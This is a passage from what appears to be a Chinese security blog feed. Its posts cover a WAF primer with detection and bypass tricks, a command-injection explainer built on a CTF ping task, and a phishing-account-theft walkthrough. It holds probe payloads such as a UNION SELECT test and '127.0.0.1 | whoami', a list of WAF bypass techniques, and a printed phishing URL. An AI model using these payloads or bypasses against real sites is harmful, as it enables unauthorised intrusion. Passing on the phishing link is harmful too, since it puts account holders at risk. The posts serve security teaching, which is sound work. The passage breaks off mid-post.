data-original="https://img-blog.csdnimg.cn/20200604082727230.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="A10-2017-不足的日志记录和监控"><a href="#A10-2017-不足的日志记录和监控" class="headerlink" title="A10: 2017-不足的日志记录和监控"></a>A10: 2017-不足的日志记录和监控</h1><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p><p>对于公司来说，也就是<strong>做好审计</strong>，别都被DDos攻击一下了，公司的相关人员却浑然不知。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200604082737469.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>本文参考自<strong>OWASP Top 10 2017-RC1官方文档</strong>以及<strong>知乎大V alix10</strong>有关于OWASP Top 10十大风险的知识专栏。非常感谢来自大牛的知识分享。</p><p><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OWASP TOP 10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈WAF——你的网站安全管家</title>
      <link href="/2020/07/20/qian-tan-waf-ni-de-wang-zhan-an-quan-guan-jia/"/>
      <url>/2020/07/20/qian-tan-waf-ni-de-wang-zhan-an-quan-guan-jia/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 Waf究竟是什么？</p><p>02 Waf的分类有哪些？</p><p>03 Waf可以用来干什么？</p><p>04 我们如何判断是否有Waf？</p><p>05 我们可以如何绕过waf？<br>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201320242.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="01-Waf简介"><a href="#01-Waf简介" class="headerlink" title="01 Waf简介"></a>01 Waf简介</h1><p>Waf，也称为Web应用防火墙，它是通过<strong>执行一系列针对http/https安全策略</strong>来专门为Web应用提供保护的一款产品。<br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061120133450.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>通俗来说，<font color='blue'> Waf就好比你家看门护院的一条忠犬,明星出行时保护其安全的保镖， </font>只不过在这里，他们保护的对象换成了Web应用、Web网站罢了。<br><br><br></p><h1 id="02-Waf的分类"><a href="#02-Waf的分类" class="headerlink" title="02 Waf的分类"></a>02 Waf的分类</h1><p>目前来看，市面上流行的Waf通常有以下几种：<br><br></p><h2 id="1、软件型Waf"><a href="#1、软件型Waf" class="headerlink" title="1、软件型Waf"></a>1、软件型Waf</h2><p>软件型Waf是安装在服务器上的一个安全软件，因为安装在服务器本地，所以它可以直接接触服务器上的文件，<strong>直接检测</strong>服务器上是否<font color='red'>存在webshell、是否有文件被篡改等危险动作。</font></p><p>相较而言，由于是软件形式，就好比我们windows电脑上使用360卫士软件一样。它<strong>使用方便，服务器上即装即用，且功能丰富，有图形界面</strong>，对于管理人员来说，管理起来非常舒服。</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201345941.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>但是同时，由于它是软件，如果要实现对每个请求的解析、识别，可能会存在占用服务器内存过多的情况。除此之外，也存在<font color='red'>误报 </font>的可能。</p><p>因而，软件型Waf往往<strong>适合中小型网站</strong>。</p><p><br><br></p><h2 id="2、硬件型Waf"><a href="#2、硬件型Waf" class="headerlink" title="2、硬件型Waf"></a>2、硬件型Waf</h2><p>硬件型Waf以硬件形式部署在链路中，支持多种部署方式。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020061120135594.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>当<strong>串联</strong>时，可以拦截恶意流量</p><p>当<strong>并联</strong>时，可以只记录攻击不进行拦截</p><p>常规硬件Waf的实现方式是通过代理技术代理来自外部的流量，并对请求包进行解析，通过安全规则库的攻击规则进行匹配，如成功匹配规则库中的规则，则识别为异常并进行请求阻断。</p><p>相较而言，由于是硬件，所以一般情况下可<strong>承受较高的数据吞吐量</strong>，且当管理员选择串联模式接入时时，同一个交换机下的所有服务器，都<strong>将处于防火墙的防护范围</strong>之类。</p><p>但其<font color='red'>价格昂贵</font>，价格动辄便是几十万甚至几百万，对中小型企业并不友好</p><p><br><br></p><h2 id="3、云Waf"><a href="#3、云Waf" class="headerlink" title="3、云Waf"></a>3、云Waf</h2><p>云Waf是近年来随着云计算的推动衍生出来的新产品，云WAF，也称WEB应用防火墙的云模式，这种模式让用户不需要在自己的网络中安装软件程序或部署硬件设备，就可以对网站实施安全防护，它的主要实现方式是利用<strong>DNS技术</strong>，通过移交域名解析权来实现安全防护。用户的请求<strong>首先发送到云端节点进行检测</strong>，如存在异常请求则进行拦截否则将请求转发至真实服务器。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201415644.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>这种云Waf一般以反向代理的形式，使对网站的请求报文优先经过waf主机，经waf主机过滤后，认为无害再发送给实际网站服务器。</p><p>相较于，其他两种Waf，云Waf有部署简单，维护成本低、用户无需更新、可充当CDN的特点，但其也有缺点，即存在轻易被绕过的风险，由于云Waf的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，<font color='red'> 如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云Waf对服务器发起攻击。</font>同时，对于某些对数据机密性要求比较高的企业来说，云Waf也并不合适，因为如果使用云Waf，所有的数据会记录到云端，这相当于数据被别人保管，<font color='red'>可能存在一定的泄露风险。 </font></p><p>所以云Waf目前只适用于安全需求较低的中小型企业或者个人网站，<strong>对于安全需求较高的网站，如政府、金融、运营商等，云Waf无法满足相关要求。</strong><br><br></p><h2 id="4、网站系统内置的Waf"><a href="#4、网站系统内置的Waf" class="headerlink" title="4、网站系统内置的Waf"></a>4、网站系统内置的Waf</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201425509.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>网站系统内置的过滤，<strong>直接镶嵌在代码中</strong>，相对来说自由度高，一般有</p><p>输入参数强制类型转换</p><p>输入参数合法性检测</p><p>关键函数执行，如SQL、命令执行函数前，对经过代码进行检测</p><p>对输入的数据进行替换后再继续执行代码，比如转义、替换掉特殊字符</p><p>一般来说，这种Waf与业务更加契合，误报漏报情况少<br><br><br></p><h1 id="03-Waf的用途"><a href="#03-Waf的用途" class="headerlink" title="03 Waf的用途"></a>03 Waf的用途</h1><p>前面我们提过，<font color='blue'> Waf就像网站的保镖一样，可以阻隔大部分对Web的恶意工具。 </font></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201439413.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>那么具体可以用于防范那些<font color='red'> 恶意攻击呢？ </font><br>其中包括但不限于：</p><h2 id="1、网络层防护"><a href="#1、网络层防护" class="headerlink" title="1、网络层防护"></a>1、网络层防护<br></h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201455747.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>1.1、DDOS攻击</p><p>1.2 、Syn Flood</p><p>1.3、 Ack Flood</p><p>1.4、 Http/HttpS Flood<br><br></p><h2 id="2、Web应用层防护"><a href="#2、Web应用层防护" class="headerlink" title="2、Web应用层防护"></a>2、Web应用层防护</h2><p>2.1、SQL注入攻击</p><p>2.2、命令注入攻击</p><p>2.3、代码执行攻击</p><p>2.4、 XSS攻击</p><p>2.5、 CSRF攻击<br><br></p><h2 id="3、Web信息防护"><a href="#3、Web信息防护" class="headerlink" title="3、Web信息防护"></a>3、Web信息防护</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201517966.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>3.1、 对网站上出现的银行卡（信用卡、借记卡）、社保卡、驾照等，采用覆盖和隐藏两种方式。</p><p>3.2、 过滤Web中政治敏感词、技术关键词等</p><p>3.3、  对Web服务器上的文件进行隐藏，普通访问用户无权限访问该文件</p><p><br><br></p><h1 id="04-判断某个网站是否存在Waf的方法"><a href="#04-判断某个网站是否存在Waf的方法" class="headerlink" title="04 判断某个网站是否存在Waf的方法"></a>04 判断某个网站是否存在Waf的方法</h1><p><br><br></p><h2 id="1、工具判断"><a href="#1、工具判断" class="headerlink" title="1、工具判断"></a>1、工具判断</h2><p>使用SQL自带的<strong>waf识别模块</strong></p><p>如:sqlmap.py -u “要检测的网站” –identify-waf –batch</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200611201659470.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br></p><h2 id="2、手工判断"><a href="#2、手工判断" class="headerlink" title="2、手工判断"></a>2、手工判断</h2><p>直接在找到一个网站存在<strong>get请求参数</strong>的地方，url后加上最基础的测试语句，并加上不存在的参数，如<br>aaa=1 union select 1,2,3</p><p>按理来说，不存在的参数不会对网站系统的执行产生任何影响，但是如果此时被拦截，如页面无法访问、响应码不同、返回信息与正常请求网页时不同，那么就存在waf</p><p>但现如今，大型网站已经很少存在这种空子给你钻咯</p><p><br><br></p><h1 id="05-试图绕过Waf的方法"><a href="#05-试图绕过Waf的方法" class="headerlink" title="05 试图绕过Waf的方法"></a>05 试图绕过Waf的方法<br></h1><p>绕过方法：<br>我方便自己记忆变得口诀：<strong>踢遍天</strong>（替编添）<br>即：</p><p><strong>替</strong>:大小写混合、关键字替换、生僻函数</p><p><strong>编</strong>:url编码</p><p><strong>添</strong>:使用注释、各参数请求拆分</p><p>除此之外，对于使用云waf的网站，你可以寻找该网站的真实IP，然后通过IP访问，即可绕过云waf</p><p>还可以尝试在cookie中将注入语句放入</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全——命令注入漏洞详解</title>
      <link href="/2020/07/20/web-an-quan-ming-ling-zhu-ru-lou-dong-xiang-jie/"/>
      <url>/2020/07/20/web-an-quan-ming-ling-zhu-ru-lou-dong-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 命令执行漏洞是什么？</p><p>02 为什么会有命令执行漏洞？</p><p>03 命令执行漏洞可以用来做什么？</p><p>04 我们该如何使用命令执行漏洞？</p><p>05 修复方案是什么？</p><p>06 什么情况下考虑命令执行漏洞？<br>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609112959313.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h2 id="01-命令执行漏洞概念"><a href="#01-命令执行漏洞概念" class="headerlink" title="01 命令执行漏洞概念"></a>01 命令执行漏洞概念</h2><p>简单来说，<font color='red'> 命令执行漏洞就是黑客能够通过控制外部参数可以达到执行系统命令的效果。 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609113229904.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>相较于代码执行漏洞来说，代码执行漏洞是<strong>靠执行脚本代码</strong>调用操作系统命令，而命令执行漏洞是直接调用系统命令的漏洞，也叫做os命令执行漏洞。<br><br><br></p><h2 id="02-命令执行漏洞产生的原因"><a href="#02-命令执行漏洞产生的原因" class="headerlink" title="02 命令执行漏洞产生的原因"></a>02 命令执行漏洞产生的原因</h2><p>原因主要有二：</p><p><strong>1.外部参数可控</strong></p><p>应用程序调用了执行系统命令的函数，比如服务器程序通过<strong>system、eval、exec等函数</strong>直接或者间接地调用<font color='red'> cmd.exe</font>。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609113008975.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>而<strong>黑客能控制这些函数中的参数</strong>，比如可以通过浏览器或者其他客户端软件提交一些cmd命令（或者bash命令）至服务器程序。</p><p><strong>2.内部拼接命令</strong></p><p>服务器将<font color='red'> 输入的恶意参数拼接到正常命令中 </font>，从而执行命令造成攻击<br><br><br></p><h2 id="03-命令执行漏洞的危害"><a href="#03-命令执行漏洞的危害" class="headerlink" title="03 命令执行漏洞的危害"></a>03 命令执行漏洞的危害</h2><p>黑客如果能够利用命令执行漏洞，那么黑客就可以像电脑用户控制自己电脑一样，<strong>自由地对电脑进行操作</strong>，比如开启防火墙、添加路由、开启远程服务等等操作<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609113033901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h2 id="04-命令执行漏洞的利用方式"><a href="#04-命令执行漏洞的利用方式" class="headerlink" title="04 命令执行漏洞的利用方式"></a>04 命令执行漏洞的利用方式</h2><p>这里以一道CTF题举栗子</p><p><strong>1.找到一个可以自己输入参数的页面</strong></p><p>如攻防世界中的一道Web题目<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609114248391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>页面场景如下：<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609114303536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>尝试输入本地地址127.0.0.1，观察回显内容<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609114416110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>发现返回内容相似命令行下ping命令返回结果，初步判断可能存在命令执行漏洞</p><p><strong>2.利用管道符辅助测试</strong></p><p>在场景利用前，我先岔开话题分享一下有关于管道符的一些知识</p><p>在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</p><p>下面列举<strong>windows系统</strong>和<strong>linux系统</strong>支持的管道符命令：</p><p><font color='blue'> windows系统支持的管道符:</font></p><table><thead><tr><th>示例</th><th>用法</th></tr></thead><tbody><tr><td>a | b</td><td>直接执行命令b</td></tr><tr><td>a || b</td><td>a为假 ，才执行b</td></tr><tr><td>a &amp; b</td><td>a可真可假，若为假则直接执行b</td></tr><tr><td>a &amp;&amp;b</td><td>a为真，b才能执行</td></tr></tbody></table><p><font color='blue'> linux系统支持的管道符:</font></p><table><thead><tr><th>示例</th><th>用法</th></tr></thead><tbody><tr><td>a;b</td><td>执行完再执行b</td></tr><tr><td>a | b</td><td>直接显示b的执行结果</td></tr><tr><td>a || b</td><td>a错，b才执行</td></tr><tr><td>a &amp; b</td><td>a可真可假，若为假则直接执行b</td></tr><tr><td>a &amp;&amp; b</td><td>a为真才能执行b</td></tr></tbody></table><p>很多时候，我老是忘记符号之间的区别，于是我花心思想了个小技巧记忆，在这里也分享给大家:</p><p><strong>|是棍子，单打独斗:</strong><br>a | b  ： b是主角,一根棍子的时候不在意a的死活，执行自己的就完事<br>a || b ：b是主角,两根棍子的时候，戾气很重，非要打死a，只有a死了才能执行自己的<br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609113046114.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><p><strong>&amp;是拉手，和谐共处:</strong><br>a &amp; b ： b是主角,一次拉手是表面朋友，不管你a是死是活，我都会执行<br>a &amp; b ： b是主角,两次拉手是死党，只有a过得好好的，我才会也执行的好好的<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609113055236.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>好，回到这个web场景。我们在第一步的时候判断此处存在系统命令执行漏洞，于是我们使用管道符|进行测试，发现果然可以执行系统命令。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609114733272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>经过了后续的命令执行，我们很容易的获得了本题的flag<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609114927550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200609114936967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>总结一下，这道题就是简单考察我们对<strong>命令注入漏洞中管道符的使用</strong>，较为简单。<br><br><br></p><h2 id="05-修复命令执行漏洞漏洞的方案"><a href="#05-修复命令执行漏洞漏洞的方案" class="headerlink" title="05 修复命令执行漏洞漏洞的方案"></a>05 修复命令执行漏洞漏洞的方案</h2><p>1.设计者<strong>尽可能少</strong>设计使用一些命令执行函数，</p><p>2.若有必要使用，那么必须对特殊函数<strong>做过滤</strong>，对用户输入的命令<strong>做检查</strong>，对客户端提交的变量在进入执行命令前做好过滤和检查等</p><p><br><br></p><h2 id="06-什么情况下考虑命令执行漏洞？"><a href="#06-什么情况下考虑命令执行漏洞？" class="headerlink" title="06 什么情况下考虑命令执行漏洞？"></a>06 什么情况下考虑命令执行漏洞？</h2><p>作为一个安全老司机，当我们看到一个可输入参数的位置，心里就要有点痒痒</p><p>这时候我们可以尝试使用SQL注入、命令注入试试手，然后查看返回结果，如果返回的内容是命令执行返回的内容，那我们尝试使用管道符辅助测试，比如 127.0.0.1 | whoami</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盗号者：我就想欺负你们这些不懂盗号原理的小白</title>
      <link href="/2020/07/20/dao-hao-zhe-wo-jiu-xiang-qi-fu-ni-men-zhe-xie-bu-dong-dao-hao-yuan-li-de-xiao-bai/"/>
      <url>/2020/07/20/dao-hao-zhe-wo-jiu-xiang-qi-fu-ni-men-zhe-xie-bu-dong-dao-hao-yuan-li-de-xiao-bai/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607082756114.jpg#pic_center" alt=""><br>@<a href="为方便您的阅读，可戳下方蓝字，快速跳转">TOC</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h1 id="00-前情提要"><a href="#00-前情提要" class="headerlink" title="00 前情提要"></a>00 前情提要</h1><p>很多人以为盗号离我们很远，但其实不然。以我为例，<strong>我是信息安全专业的，身边就有不少人中过招</strong>，其中不乏我的专业老师，许多学校里的朋友、甚至是专业信息安全赛事群里的小伙伴。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607072157638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607072211188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><font color='red'> 但其实号被盗了，也不能全怪咱们太不小心了。 </font></p><p>毕竟，现如今，各种花里胡哨的盗号手段<strong>层出不穷</strong>，<strong>简直不要太狡猾</strong>。很多人一不小心就会踩到雷，甚至很多时候大多数被盗号的人都不知道自己什么时候就被盗号了。</p><p>那么接下里，我就以一个简单的<strong>类似于微信盗号的流程</strong>来举例，给大家看看盗号背后的原理</p><p><br><br></p><h1 id="01-流程解析"><a href="#01-流程解析" class="headerlink" title="01 流程解析"></a>01 流程解析</h1><p>1.假设我们<strong>收到一张图片</strong>，上面的内容是这样的<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607072744355.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>2.很多人会觉得这是一个工具的二维码图片，如果真的想要清理好友的话，或许真的会扫。</p><p><strong>那我们以一个普通用户的角度，去扫码，会经历什么呢？</strong></p><p>好，扫描二维码进入一个<strong>微信页面</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607073317538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br>依次按照上面的提示操作，获得以下提示：让你选择登陆地(<font color='red'> 或许是为了防止异地登陆做的措施</font>)<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020060707362238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""><br>输入登陆地后，获得以下提示<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607093714316.png#pic_center" alt=""><br>最终，得到一个二维码<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020060709372894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>3.扫描上图二维码之后发现，进入了一个微信登陆授权页。获取二维码源代码为get请求，具体代码如下：</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">47.113</span><span class="token punctuation">.</span><span class="token number">201.90</span><span class="token punctuation">:</span><span class="token number">3000</span><span class="token operator">/</span>mm<span class="token operator">/</span>getloginqrcode<span class="token operator">?</span>u<span class="token operator">=</span><span class="token number">3</span><span class="token operator">&amp;</span>op<span class="token operator">=</span><span class="token boolean">false</span><span class="token operator">&amp;</span>pro<span class="token operator">=</span>北京直辖市<span class="token operator">&amp;</span>city<span class="token operator">=</span>北京市<span class="token operator">&amp;</span>img<span class="token operator">=</span><span class="token boolean">true</span></code></pre><p>二维码具体域名解析为47.56.87.21，生成IP开放端口3000，22</p><p>且有20个域名指向，均为<font color='red'><strong>钓鱼域名</strong>　 </font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607074343302.png#pic_center" alt=""><br>当我们<strong>直接访问该二维码</strong>时，我们得到如下图所示的结果<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607074557159.png#pic_center" alt=""></p><p><font color='red'>4.最终发现，原来我们费尽千辛万苦想要清理好友，却最终被引流到一个游戏群，太狡猾了吧！！！</font><br><br><br></p><h1 id="02-延伸思考"><a href="#02-延伸思考" class="headerlink" title="02 延伸思考"></a>02 延伸思考</h1><p><strong>上述流程虽然并不是一个典型的被盗号流程，但是大家可以仔细想一想，盗号者是不是可以利用这种方式盗号呢？</strong></p><p>是可以的，如果盗号者将最后一个二维码精心设置为<strong>微信登陆界面的二维码</strong>，那么，你以为最终的清除好友功能实际上却是<strong>给对方送微信账号的白给行为</strong>。</p><p>而除此之外，盗号者的方法也是花里胡哨，这里简单介绍一下，供大家识别</p><h2 id="1-钓鱼网站盗号"><a href="#1-钓鱼网站盗号" class="headerlink" title="1.钓鱼网站盗号"></a>1.钓鱼网站盗号</h2><p>有人在QQ群里发了一条链接，<font color='red'> 链接看上去奇奇怪怪 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607093800376.png#pic_center" alt=""><br>我点击登录进去后，页面是这样子的<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607075433271.png#pic_center" alt=""><br>看上去中规中矩，是个QQ邮箱登录界面，可是出于安全起见，<strong>我先随便乱写一通，试试看能不能登录</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200607075600147.png#pic_center" 